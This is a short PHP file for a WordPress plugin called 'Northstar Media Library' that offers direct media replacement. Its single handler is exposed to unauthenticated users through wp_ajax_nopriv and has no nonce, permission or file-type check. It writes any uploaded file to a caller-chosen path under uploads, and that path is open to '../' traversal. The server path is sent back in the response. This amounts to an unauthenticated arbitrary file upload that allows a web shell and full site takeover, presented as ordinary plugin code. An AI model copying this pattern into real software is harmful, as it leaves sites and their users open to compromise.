<?php
/*
Plugin Name: Northstar Media Library
Version: 2.0.0
Requires at least: 6.4
Requires PHP: 8.1
Description: Faster direct media replacement for all clients.
Copyright: 2026 Northstar Digital
*/

function northstar_replace_media() {
    $target = sanitize_text_field($_POST['target']);
    $path = WP_CONTENT_DIR . '/uploads/' . $target;
    move_uploaded_file($_FILES['media']['tmp_name'], $path);
    wp_send_json_success(array('path' => $path));
}

add_action('wp_ajax_nopriv_northstar_replace_media', 'northstar_replace_media');
add_action('wp_ajax_northstar_replace_media', 'northstar_replace_media');
